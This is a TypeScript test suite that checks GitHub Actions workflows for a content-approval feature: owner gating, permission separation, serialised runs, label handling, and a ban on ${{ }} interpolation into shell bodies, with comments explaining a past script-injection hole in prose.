 * Every `run: |` block in a workflow, as { step, body }.
 *
 * Written by hand rather than with a YAML parser because the repo ships none
 * as a dependency, and because the property under test is textual anyway: a
 * `${{ }}` is substituted into the script SOURCE before bash parses it, so
 * what matters is exactly which characters land inside the block scalar.
 *
 * A block scalar's body is every following line indented deeper than the
 * `run:` key itself, blank lines included.
 */
function runBodies(text: string): { step: string; body: string }[] {
  const lines = text.split('\n');
  const out: { step: string; body: string }[] = [];
  let step = '(unnamed)';
  for (let i = 0; i < lines.length; i++) {
    const named = /^\s*- name:\s*(.+?)\s*$/.exec(lines[i]);
    if (named) step = named[1];
    const run = /^(\s*)run:\s*[|>][-+]?\s*$/.exec(lines[i]);
    if (!run) continue;
    const indent = run[1].length;
    const body: string[] = [];
    let j = i + 1;
    for (; j < lines.length; j++) {
      const line = lines[j];
      if (line.trim() === '') {
        body.push(line);
        continue;
      }
      if (line.search(/\S/) <= indent) break;
      body.push(line);
    }
    out.push({ step, body: body.join('\n') });
    i = j - 1;
  }
  return out;
}

test.describe('moment-approve.yml', () => {
  const yml = () => withoutComments(workflow('moment-approve.yml'));

  test('the job runs only for the approve-moment label', () => {
    expect(yml()).toMatch(/if:\s*github\.event\.label\.name == 'approve-moment'/);
    expect(yml()).toMatch(/issues:\n\s+types: \[labeled\]/);
  });

  test('the owner check is the FIRST step, before any checkout', () => {
    const text = yml();
    const gate = text.indexOf('- name: Only the repo owner may approve');
    const checkout = text.indexOf('uses: actions/checkout');
    expect(gate).toBeGreaterThan(-1);
    expect(checkout).toBeGreaterThan(-1);
    expect(gate).toBeLessThan(checkout);
  });

  test('the owner check is its OWN job, and that job holds no write scope worth stealing', () => {
    // A step that decides whether an untrusted trigger may proceed should not
    // itself be holding the capability it is deciding about. `authorize` can
    // comment and unlabel; it cannot write a branch. `publish` declares the
    // write scopes and cannot start until `authorize` passes.
    const text = yml();
    const authorize = text.slice(text.indexOf('  authorize:'), text.indexOf('  publish:'));
    expect(authorize).toContain('issues: write');
    expect(authorize).not.toContain('contents: write');
    expect(authorize).not.toContain('pull-requests: write');
    expect(authorize).not.toContain('actions: write');
    expect(authorize).not.toContain('actions/checkout');
    expect(text).toMatch(/publish:\n\s+needs: authorize/);
    // …and no workflow-level grant that would hand the write scopes to both.
    expect(text).not.toMatch(/^permissions:/m);
  });

  test('runs serialise on the FILE they contend for, not on the issue that triggered them', () => {
    // Keyed per issue, two different candidates labelled a minute apart each
    // read a 5-live data/moments.json and each concluded it had room — the
    // 6-cap checked twice, concurrently, against the same stale snapshot.
    const text = yml();
    expect(text).toMatch(/group: moment-approve\s*$/m);
    expect(text).not.toMatch(/group: moment-approve-\$\{\{/);
    expect(text).toMatch(/cancel-in-progress: false/);
  });

  test('it checks BOTH the labeler and the actor against the owner, and fails the run', () => {
    const text = yml();
    expect(text).toMatch(/APPROVE_OWNER: cm2489/);
    expect(text).toMatch(/SENDER: \$\{\{ github\.event\.sender\.login \}\}/);
    expect(text).toMatch(/ACTOR: \$\{\{ github\.actor \}\}/);
    expect(text).toMatch(/\[ "\$SENDER" != "\$APPROVE_OWNER" \] \|\| \[ "\$ACTOR" != "\$APPROVE_OWNER" \]/);
    // remove the label, say why, and go red — a quiet green check would hide
    // an unauthorized attempt to publish.
    expect(text).toMatch(/--remove-label "\$LABEL"/);
    expect(text).toMatch(/exit 1/);
  });

  test('nothing derived from the issue is interpolated into a shell body', () => {
    // github.event.issue.body / .title / comment bodies are attacker-influenced
    // text. They reach the script as FILES, fetched by `gh`, never spliced into
    // a command line. Same rule moment-watch.yml states over its FILED receipt.
    const text = yml();
    expect(text).not.toMatch(/\$\{\{\s*github\.event\.issue\.body/);
    expect(text).not.toMatch(/\$\{\{\s*github\.event\.issue\.title/);
    expect(text).not.toMatch(/\$\{\{\s*github\.event\.comment/);
    expect(text).toMatch(/--json body --jq \.body > \/tmp\/approve\/body\.md/);
  });

  /*
   * THE PIN ABOVE PASSED WITH THE HOLE OPEN, which is why this one exists.
   *
   * It enumerated three `github.event.*` paths — the obvious carriers of issue
   * text — and said nothing about `steps.*.outputs.*`. But a step output is
   * issue text one hop later: `moment_id` and `reason` are computed FROM the
   * issue body, and `echo "::notice::refused (${{ steps.decide.outputs.reason
   * }})"` shipped for three days on a job holding `contents: write` against an
   * unprotected `main`. A crafted issue key could forge a second
   * $GITHUB_OUTPUT line and land its own text inside that shell command.
   *
   * A denylist of known-bad paths can only ever be one context behind, so this
   * bans the SHAPE: no `${{ … }}` of any kind inside a `run:` body, ever.
   * `${{ … }}` is textual substitution performed before bash sees the line, so
   * there is no such thing as a safely-quoted one. Every value a script needs
   * goes through `env:`, where it is a variable rather than source code.
   */
  test('NO ${{ }} expression of any kind appears inside a run: body', () => {
    const offenders: string[] = [];
    for (const wf of ['moment-approve.yml', 'moment-watch.yml']) {
      for (const { step, body } of runBodies(workflow(wf))) {
        for (const line of body.split('\n')) {
          if (/\$\{\{/.test(line) && !/^\s*#/.test(line)) {
            offenders.push(`${wf} · ${step}: ${line.trim()}`);
          }
        }
      }
    }
    expect(
      offenders,
      'a ${{ }} expression inside a run: body is textual substitution into source, not a variable — move it into env: and reference $VAR',
    ).toEqual([]);
  });

  test('the outputs a run: body DOES read are all bound through env:', () => {
    // The counterpart to the ban above: the values are still used, just
    // through the safe channel. If this ever finds none, the ban above has
    // become vacuous and is passing for the wrong reason.
    const text = yml();
    expect(text).toMatch(/REASON: \$\{\{ steps\.decide\.outputs\.reason \}\}/);
    expect(text).toMatch(/BRANCH: \$\{\{ steps\.decide\.outputs\.branch \}\}/);
    expect(text).toMatch(/\$\{REASON\}/);
  });

  test('the label is removed on every refusal path, so re-applying it is the retry', () => {
    const text = yml();
    const removals = text.match(/--remove-label "\$LABEL"/g) ?? [];
    // unauthorized · script refusal · gate failure · branch already exists
    expect(removals.length).toBeGreaterThanOrEqual(4);
  });

  test('the curation gate re-runs on the working tree and restores the file when it fails', () => {
    const text = yml();
    expect(text).toMatch(/node scripts\/check-moments\.mjs --require-baseline/);
    expect(text).toMatch(/git checkout -- data\/moments\.json/);
  });

  test('CI is dispatched, because a GITHUB_TOKEN pull request fires no on: pull_request', () => {
    expect(yml()).toMatch(/gh workflow run ci\.yml/);
  });

  test('auto-merge is ATTEMPTED, and its failure is a supported outcome rather than a red run', () => {
    // Verified against the API 2026-08-12: allow_auto_merge is false, main is
    // unprotected, no rulesets, no required checks — so this command fails on
    // every generated PR today and the else-branch is the LIVE path. The step
    // name and the issue comment both have to say so; a workflow that
    // announces "merges itself" over a command that cannot succeed is the
    // failure mode this project calls a shipped claim that is not true.
    const text = yml();
    expect(text).toMatch(/gh pr merge .*--auto --squash/);
    expect(text).toMatch(/if gh pr merge/);
    expect(text).toMatch(/- name: Attempt auto-merge on green/);
    expect(text).toContain('Allow auto-merge');
    expect(text).toContain('required status check');
    // the not-available comment must tell him the PR is waiting for HIM
    expect(text).toMatch(/waiting for you/);
  });

  test('it commits as oravan-sync — a bot author silently breaks the Vercel deploy', () => {
    // docs/solutions/vercel-bot-push-blocked-deploys.md. Every data workflow
    // in this repo pays the same rent; a Big Question that merges and does not
    // deploy is the worst version of this feature.
    expect(yml()).toMatch(/git config user\.name\s+"oravan-sync"/);
  });

  test('no if: always() anywhere — a failure earlier must skip the publish, not proceed past it', () => {
    expect(yml()).not.toMatch(/if:\s*always\(\)/);
  });
});

test('the approve label is created by the workflow that opens the issues it goes on', () => {
  // The ordering problem: a label must exist before it can be applied, and a
  // workflow triggered BY the label only ever runs afterwards. moment-watch.yml
  // is what bootstraps it; moment-approve.yml re-upserts it so the colour and
  // description stay under version control from both directions.
  expect(withoutComments(workflow('moment-watch.yml'))).toMatch(/gh label create approve-moment .*--force/);
  expect(withoutComments(workflow('moment-approve.yml'))).toMatch(/gh label create "\$LABEL" .*--force/);
});

test('the candidate issue tells the owner how to approve, not only how to decline', () => {
  const lines = APPROVE_INSTRUCTIONS(3).join('\n');
  expect(lines).toContain('approve-moment');
  expect(lines).toContain('exactly as written');
  // With no room, the same block asks for the directive up front rather than
  // letting the owner discover it from a bot comment.
  expect(APPROVE_INSTRUCTIONS(0).join('\n')).toContain('/replace <moment-id>');
  expect(APPROVE_INSTRUCTIONS(3).join('\n')).not.toContain('/replace <moment-id>');
});
